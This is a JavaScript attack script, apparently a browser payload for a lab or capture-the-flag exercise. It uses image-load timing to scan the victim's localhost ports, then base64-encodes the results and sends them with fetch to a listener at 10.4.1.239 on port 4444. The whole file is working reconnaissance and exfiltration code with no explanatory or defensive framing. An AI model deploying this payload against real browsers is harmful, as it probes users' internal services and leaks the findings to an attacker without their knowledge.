let portIsOpen = (hostToScan, portToScan, N) => {
  return new Promise((resolve, reject) => {
    let portIsOpen = 'unknown';

    let timePortImage = (port) => {
      return new Promise((resolve, reject) => {
        let t0 = performance.now()
        // a random appendix to the URL to prevent caching
        let random = Math.random().toString().replace('0.', '').slice(0, 7)
        let img = new Image;

        img.onerror = () => {
          let elapsed = (performance.now() - t0)
          // close the socket before we return
          resolve(parseFloat(elapsed.toFixed(3)))
        }

        img.src = 'http://' + hostToScan + ':' + port + '/' + random + '.png'
      })
    }

    const portClosed = 37857; // let's hope it's closed :D

    (async () => {
      let timingsOpen = [];
      let timingsClosed = [];
      for (let i = 0; i < N; i++) {
        timingsOpen.push(await timePortImage(portToScan))
        timingsClosed.push(await timePortImage(portClosed))
      }

      let sum = (arr) => arr.reduce((a, b) => a + b);
      let sumOpen = sum(timingsOpen);
      let sumClosed = sum(timingsClosed);
      let test1 = sumOpen >= (sumClosed * 1.3);
      let test2 = false;

      let m = 0;
      for (let i = 0; i <= N; i++) {
        if (timingsOpen[i] > timingsClosed[i]) {
          m++;
        }
      }
      // 80% of timings of open port must be larger than closed ports
      test2 = (m >= Math.floor(0.8 * N));
      portIsOpen = test1 && test2;
      resolve(`Port ${portToScan}: ${portIsOpen ? 'open' : 'closed'}`);
    })();
  });
}

const lhost = '10.4.1.239';
const lport = '4444';
//const ports = [21, 22, 80, 443];
const ports = [80, 3500, 8080, 15000, 50000];
const portscan = async () => {
    const promises = ports.map(p => (portIsOpen('localhost', p, 30)));
    const result = (await Promise.all(promises)).join('\n')
    fetch(`http://${lhost}:${lport}?key=` + btoa(result));
    return result;
}

portscan()
    .then((res) => {
        console.log('Portscan is completed.');
	console.log(res);
    })
    .catch((err) => {
	console.log('Error occurred.');
	console.log(err)
    })
